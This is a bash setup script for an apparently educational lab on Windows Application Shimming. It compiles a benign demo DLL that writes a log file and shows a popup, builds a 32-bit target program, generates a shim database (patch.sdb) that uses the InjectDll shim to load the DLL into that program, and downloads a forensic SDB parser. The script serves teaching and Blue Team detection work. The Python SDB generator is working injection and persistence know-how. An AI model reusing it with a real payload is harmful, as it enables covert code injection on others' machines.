
#!/bin/bash

# =============================================================================
#  sdbExplorer_ubuntu_setup.sh  —  SdbExplorer Lab  |  One-time setup
# =============================================================================
#  Run this ONCE before handing the lab to users.
#  Creates ~/BnB/SdbExplorer/ with all files the Python web server needs
#  to serve to the Windows VM:
#
#    demo.dll       32-bit benign payload (popup + log file)
#    target.exe     32-bit Win32 target app  (replaces notepad.exe)
#    patch.sdb      Shim Database — InjectDll targeting target.exe
#    sdb-explorer.exe  Forensic SDB parser (Windows executable)
#
#  WHY target.exe instead of notepad.exe?
#    On Windows 11 / Server 2025, notepad.exe is a UWP stub. The Win32
#    process dies in milliseconds, before the Shim Engine injects anything.
#    target.exe is a genuine 32-bit Win32 app we control completely.
#
#  WHY 32-bit?
#    Custom SDB InjectDll works reliably for 32-bit processes under WoW64.
#    64-bit shimming is blocked on modern Windows builds.
# =============================================================================

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
die()     { echo -e "${RED}[ERROR]${NC} $*" >&2; exit 1; }

# ─── Configuration ────────────────────────────────────────────────────────────
LAB_DIR="$HOME/BnB/SdbExplorer"

# Path where demo.dll will land on the WINDOWS VM (baked into patch.sdb).
WIN_DLL_PATH='C:\Users\Public\demo.dll'

# The SDB targets this process name (no path — AppCompat matches by name only).
TARGET_EXE='target.exe'

# Where sdb-explorer.exe comes from (set URL or place the file next to this script).
SDB_EXPLORER_URL="https://raw.githubusercontent.com/PadeanuVlad1501/lab_script_repo/refs/heads/main/SdbExplorer_lab/sdb-explorer.exe"

# =============================================================================
echo ""
echo -e "${BOLD}════════════════════════════════════════════${NC}"
echo -e "${BOLD}   SdbExplorer Lab — Ubuntu Setup Script    ${NC}"
echo -e "${BOLD}════════════════════════════════════════════${NC}"
echo ""

# =============================================================================
#  STEP 0 — Prerequisites
# =============================================================================
info "Checking prerequisites..."

if ! command -v python3 &>/dev/null; then
    die "python3 not found. Run: sudo apt-get install -y python3"
fi
success "python3: $(python3 --version)"

# Install mingw-w64 if missing (needed to cross-compile 32-bit Windows binaries)
if ! command -v i686-w64-mingw32-gcc &>/dev/null; then
    info "Installing mingw-w64 cross-compiler..."
    sudo apt-get update -qq && sudo apt-get install -y mingw-w64
fi
success "mingw-w64: $(i686-w64-mingw32-gcc --version | head -1)"

if ! command -v wget &>/dev/null; then
    sudo apt-get install -y wget
fi

# =============================================================================
#  STEP 1 — Create lab directory
# =============================================================================
echo ""
info "Creating lab directory: $LAB_DIR"
mkdir -p "$LAB_DIR"
success "Directory ready"

# =============================================================================
#  STEP 2 — Compile demo.dll  (32-bit benign payload)
# =============================================================================
echo ""
info "Compiling demo.dll (32-bit)..."

# Write C source to a temp file
PAYLOAD_SRC=$(mktemp /tmp/demo_XXXXXX.c)
cat > "$PAYLOAD_SRC" << 'CSRC'
/*
 * demo.dll — SdbExplorer Lab benign payload
 * When injected into target.exe via Application Shimming, this DLL:
 *   1. Writes a log file to C:\Windows\Temp\shimmed.log  (evidence artifact)
 *   2. Shows a message box                               (visible proof)
 * No network connections. No shell. Safe for use in any training environment.
 */
#include <windows.h>

#define LOG_PATH "C:\\Windows\\Temp\\shimmed.log"
#define LOG_MSG  "[SdbExplorer Lab] demo.dll injected via Application Shimming.\r\n"

static void write_log(void) {
    HANDLE h = CreateFileA(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    DWORD w;
    WriteFile(h, LOG_MSG, (DWORD)(sizeof(LOG_MSG) - 1), &w, NULL);
    CloseHandle(h);
}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDLL);
        write_log();
        MessageBoxA(NULL,
            "Application Shimming Demo\n\n"
            "This popup was triggered by demo.dll,\n"
            "injected into target.exe by patch.sdb.\n\n"
            "Click OK, then check the Blue Team phase.",
            "SdbExplorer Lab \xE2\x80\x94 Shim Active",
            MB_OK | MB_ICONWARNING | MB_SETFOREGROUND);
    }
    return TRUE;
}
CSRC

i686-w64-mingw32-gcc -shared \
    -o "$LAB_DIR/demo.dll" \
    "$PAYLOAD_SRC" \
    -luser32 -lkernel32 \
    -Wl,--subsystem,windows

rm -f "$PAYLOAD_SRC"

if [[ -f "$LAB_DIR/demo.dll" ]]; then
    success "demo.dll compiled → $(du -h "$LAB_DIR/demo.dll" | cut -f1)"
else
    die "demo.dll compilation failed."
fi

# =============================================================================
#  STEP 3 — Compile target.exe  (32-bit Win32 target application)
# =============================================================================
echo ""
info "Compiling target.exe (32-bit)..."

TARGET_SRC=$(mktemp /tmp/target_XXXXXX.c)
cat > "$TARGET_SRC" << 'CSRC'
/*
 * target.exe — SdbExplorer Lab target application
 * A genuine 32-bit Win32 process used as the shimming target.
 * Replaces notepad.exe, which is a UWP stub on Windows 11/Server 2025
 * and dies before the Shim Engine can inject anything.
 *
 * When shimmed, demo.dll runs BEFORE WinMain — so the demo.dll popup
 * appears first, then this box appears, making the sequence obvious.
 */
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR cmdLine, int show) {
    MessageBoxA(NULL,
        "SdbExplorer Lab — Target Application\n\n"
        "If the demo.dll popup appeared BEFORE this box,\n"
        "the Application Shimming injection was successful.\n\n"
        "Leave this window open and switch to PowerShell\n"
        "for the Blue Team detection phase.",
        "SdbExplorer Lab \xE2\x80\x94 Target App",
        MB_OK | MB_ICONINFORMATION);
    return 0;
}
CSRC

i686-w64-mingw32-gcc \
    -o "$LAB_DIR/target.exe" \
    "$TARGET_SRC" \
    -luser32 \
    -mwindows

rm -f "$TARGET_SRC"

if [[ -f "$LAB_DIR/target.exe" ]]; then
    success "target.exe compiled → $(du -h "$LAB_DIR/target.exe" | cut -f1)"
else
    die "target.exe compilation failed."
fi

# =============================================================================
#  STEP 4 — Generate patch.sdb
# =============================================================================
echo ""
info "Generating patch.sdb..."
info "  Target EXE : $TARGET_EXE"
info "  DLL path   : $WIN_DLL_PATH"

python3 - "$TARGET_EXE" "$WIN_DLL_PATH" "$LAB_DIR/patch.sdb" << 'PYTHON'
import struct, sys, os

# ── Tag helpers ───────────────────────────────────────────────────────────────
# Tag format: 2-byte little-endian  →  upper nibble = data type, lower 12 = ID
# Type 0x7 = LIST   (4-byte content length + nested tags)
# Type 0x8 = STRING (4-byte byte length + UTF-16LE chars)

def _tag(t, i):      return struct.pack('<H', (t << 12) | i)
def str_tag(i, v):
    e = v.encode('utf-16-le') + b'\x00\x00'
    return _tag(8, i) + struct.pack('<I', len(e)) + e
def list_tag(i, *c): b = b''.join(c); return _tag(7,i)+struct.pack('<I',len(b))+b

# Tag IDs
DATABASE, LIBRARY, EXE, SHIM_REF = 0x001, 0x002, 0x007, 0x00E
NAME, APP_NAME, MODULE            = 0x001, 0x004, 0x006

target_exe = sys.argv[1]
dll_path   = sys.argv[2]
out_path   = sys.argv[3]

sdb = list_tag(DATABASE,
    list_tag(LIBRARY),          # empty — InjectDll is a built-in Windows shim
    list_tag(EXE,
        str_tag(NAME,     target_exe),
        str_tag(APP_NAME, 'SdbExplorerLab'),
        list_tag(SHIM_REF,
            str_tag(NAME,   'InjectDll'),
            str_tag(MODULE, dll_path),
        ),
    ),
)

with open(out_path, 'wb') as f:
    f.write(sdb)

print(f'[+] patch.sdb written  ({os.path.getsize(out_path)} bytes)')
print(f'    Target : {target_exe}')
print(f'    Module : {dll_path}')
PYTHON

success "patch.sdb generated"
echo ""
warn "TEST REQUIRED before deploying to users:"
warn "  On the Windows VM, install with the 32-bit installer:"
warn "  C:\\Windows\\SysWOW64\\sdbinst.exe patch.sdb"
warn "  Then run target.exe — demo.dll popup must appear first."
warn "  Verify registry under: HKLM\\SOFTWARE\\WOW6432Node\\...\\AppCompatFlags\\"

# =============================================================================
#  STEP 5 — Place sdb-explorer.exe
# =============================================================================
echo ""
info "Setting up sdb-explorer.exe..."

DEST="$LAB_DIR/sdb-explorer.exe"

if   [[ -n "$SDB_EXPLORER_URL" ]]; then
    wget -q --show-progress -O "$DEST" "$SDB_EXPLORER_URL"
    success "sdb-explorer.exe downloaded"
elif [[ -f "$(dirname "$0")/sdb-explorer.exe" ]]; then
    cp "$(dirname "$0")/sdb-explorer.exe" "$DEST"
    success "sdb-explorer.exe copied from script directory"
elif [[ -f "$DEST" ]]; then
    success "sdb-explorer.exe already present"
else
    warn "sdb-explorer.exe not found. Options:"
    warn "  A) Set SDB_EXPLORER_URL at the top of this script"
    warn "  B) Place sdb-explorer.exe next to ubuntu_setup.sh and re-run"
    warn "  Suggested source: https://github.com/evil-e/sdb-explorer/releases"
fi

# =============================================================================
#  STEP 6 — Final verification
# =============================================================================
echo ""
echo -e "${BOLD}────────────────────────────────────────────${NC}"
info "Lab directory contents:"
echo ""
ls -lh "$LAB_DIR" 2>/dev/null || true
echo ""

ALL_OK=true
for f in demo.dll target.exe patch.sdb sdb-explorer.exe; do
    if [[ -f "$LAB_DIR/$f" ]]; then
        success "$f  ✓"
    else
        warn    "$f  ✗  MISSING"
        ALL_OK=false
    fi
done

echo ""
if [[ "$ALL_OK" == true ]]; then
    echo -e "${GREEN}${BOLD}Setup complete. Run lab_start.sh at the start of each session.${NC}"
else
    echo -e "${YELLOW}${BOLD}Setup finished with warnings — resolve missing files before deploying.${NC}"
fi
echo ""
